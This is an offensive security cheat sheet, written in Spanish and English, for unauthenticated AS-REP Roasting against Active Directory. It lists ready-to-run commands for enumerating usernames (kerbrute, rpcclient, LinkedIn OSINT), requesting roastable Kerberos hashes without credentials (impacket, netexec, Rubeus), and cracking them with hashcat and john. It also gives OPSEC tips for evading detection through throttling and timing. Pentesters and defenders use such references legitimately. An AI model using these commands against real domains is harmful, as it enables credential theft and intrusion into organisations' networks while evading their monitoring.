---
aliases:
  - Unauth AS-REP
  - GetNPUsers no-pass
  - Pre-Auth Roast
tags:
  - type/technique
  - technique/credential-access
  - technique/kerberos
  - asset/active-directory
  - cred/kerberos
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AS-REP Roasting]]"
---
# AS-REP Roasting - Roast Without Auth

***

## Concept

| **Aspecto** | **Detalle** |
|:---:|:---:|
| Required | Solo lista de usernames + DC reachable | Sin creds. |
| Auth check | KDC responde con AS-REP si `DONT_REQ_PREAUTH` set, error otherwise | Silent enum. |
| OPSEC | Event 4768 con `Pre-Authentication Type: 0` en DC | Defender side. |
| Use case | Pre-foothold inicial (sin creds del domain) | First-attempt vector. |
^asrep-unauth-concept

___

## Impacket GetNPUsers (Unauth)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-GetNPUsers corp.local/ -dc-ip <DC> -usersfile users.txt -no-pass -format hashcat -outputfile h.txt` | Bulk roast con username list (sin creds) | Pre-foothold. |
| `impacket-GetNPUsers corp.local/ -dc-ip <DC> -usersfile users.txt -no-pass -request` | Auto-request si user vulnerable | Standard. |
| `impacket-GetNPUsers corp.local/<single-user> -dc-ip <DC> -no-pass -request` | Single user check | Targeted. |
| `impacket-GetNPUsers corp.local/ -dc-ip <DC> -usersfile users.txt -no-pass -format john` | John format | Alt cracker. |
^asrep-unauth-impacket

```bash
# Pipeline standard
impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.10 \
  -usersfile users.txt -no-pass \
  -format hashcat -outputfile asrep.hash

# Output (per user):
# $krb5asrep$23$jsmith@CORP.LOCAL:abc123def456...
# (users sin DONT_REQ_PREAUTH = silent skip)
```

___

## netexec (Unauth)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc ldap <DC> -u users.txt -p '' --asreproast asrep.hash` | Bulk unauth roast | Quick. |
| `nxc ldap <DC> -u <single> -p '' --asreproast h.txt` | Single user | Targeted. |
^asrep-unauth-nxc

```bash
# nxc unauth
nxc ldap <DC> -u users.txt -p '' --asreproast asrep.hash
```

___

## Username List Generation

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `kerbrute userenum --dc <DC> -d corp.local <wordlist>` | Validate usernames via Kerberos pre-auth | Pre-roast. |
| `nxc smb <DC> -u '' -p '' --users` | Null SAMR enum | Si null permitido. |
| `rpcclient -U "" <DC> -N -c 'enumdomusers'` | RPC anonymous | Alt. |
| `enum4linux-ng -U <DC>` | Anonymous comprehensive | Bulk. |
| `python3 linkedin2username.py -c "<Company>" -u u -p pass -n corp.local` | OSINT generation | Pre-engagement. |
| `username-anarchy -i names.txt > usernames.txt` | Permutations from "First Last" | Standard. |
| `cp /usr/share/seclists/Usernames/Names/names.txt usernames.txt` | SecLists baseline | Generic. |
^asrep-unauth-userlist

```bash
# Pipeline OSINT → kerbrute → AS-REP
# 1. Generate
python3 linkedin2username.py -c "Target Co" -u atacante -p pass -n corp.local
cat *.txt | sort -u > all_users.txt

# 2. Validate via kerbrute
kerbrute userenum --dc <DC> -d corp.local all_users.txt -o valid.txt

# 3. AS-REP roast con valid users
awk '{print $NF}' valid.txt | sed 's/@.*//' > clean_users.txt
impacket-GetNPUsers corp.local/ -dc-ip <DC> \
  -usersfile clean_users.txt -no-pass \
  -format hashcat -outputfile asrep.hash
```

___

## Per-User Single Test

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-GetNPUsers corp.local/<user> -dc-ip <DC> -no-pass` | Single user test | Quick. |
| `Rubeus.exe asreproast /user:<user> /domain:corp.local /dc:<DC>` | Windows targeted | Standard. |
^asrep-unauth-single

```bash
# Quick test single user
impacket-GetNPUsers corp.local/jsmith -dc-ip <DC> -no-pass

# Output positive:
# $krb5asrep$23$jsmith@CORP.LOCAL:...

# Output negative:
# [-] User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
```

___

## OPSEC Considerations

| **Práctica** | **Detalle** | **Cuándo** |
|:---:|:---:|:---:|
| Username list size matters | Bulk = 1000s 4768 events | Throttle. |
| `kerbrute userenum` first → reduce a valid users only | Reduces noise | Standard pre-flight. |
| Time-of-day matching | Match office hours legit auth | Stealth. |
| Single user spaced requests | Reduce burst pattern | Per-user pacing. |
| Detection: bulk 4768 con `Pre-Auth Type: 0` | MDI alert `AS-REP roasting` | Defender side. |
| AS-REP request from non-domain-joined source IP | Anomaly | Defender. |
^asrep-unauth-opsec

___

## Common Errors

| **Error** | **Causa** | **Fix** |
|:---:|:---:|:---:|
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | User no existe | Skip. |
| `KDC_ERR_PREAUTH_REQUIRED` | User existe pero pre-auth requerido (no roastable) | Skip. |
| Hash AS-REP retornado | `DONT_REQ_PREAUTH` set | **Crackeable**. |
| `Connection refused 88` | DC reachability | Test puerto + firewall. |
| `KRB_AP_ERR_SKEW` | Clock skew | NTP sync. |
| Output file vacío | Sin users vulnerables o user list inválida | Validate users primero con kerbrute. |
^asrep-unauth-errors

___

## Hash Format

```
# Hashcat mode 18200 ready
$krb5asrep$23$user@CORP.LOCAL:abc123def456789...

# Format breakdown:
# $krb5asrep$ = AS-REP marker
# 23         = etype (RC4-HMAC-MD5)
# user@DOM   = user principal name
# abc123...  = encrypted blob (crackeable)
```

___

## Crack Pipeline

```bash
# Standard
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -O

# + rules
hashcat -m 18200 asrep.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O

# John alt
john --format=krb5asrep --wordlist=rockyou.txt asrep.hash

# Show cracked
hashcat -m 18200 asrep.hash --show
```

***
